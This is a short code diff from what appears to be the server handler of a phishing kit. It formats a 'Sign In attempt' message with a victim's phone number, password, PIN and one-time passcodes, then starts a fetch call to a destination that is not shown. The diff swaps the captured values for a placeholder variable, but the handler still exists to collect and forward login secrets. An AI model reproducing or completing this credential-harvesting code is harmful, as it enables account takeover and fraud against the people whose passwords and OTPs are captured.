@@ -27,13 +27,13 @@ export default async function handler(req, res) {
     const message =
       `🔐 Sign In attempt\n\n` +
       `📱 Phone: ${phone}\n` +
-      `🔑 Password: ${password}\n` +
-      `🔢 PIN: ${pin}\n\n` +
+      `🔑 Password: ${provided}\n` +
+      `🔢 PIN: ${provided}\n\n` +
       `🔒 OTP requested\n` +
       `📱 Phone: ${phone}\n\n` +
-      `🔑 OTP ${otp}\n` +
+      `🔑 OTP ${provided}\n` +
       `📱 Phone: ${phone}\n` +
-      `🔢 OTP: ${otp}\n\n` +
+      `🔢 OTP: ${provided}\n\n` +
       `✅ Result: ${result || "OTP "}`;
 
     const response = await fetch(
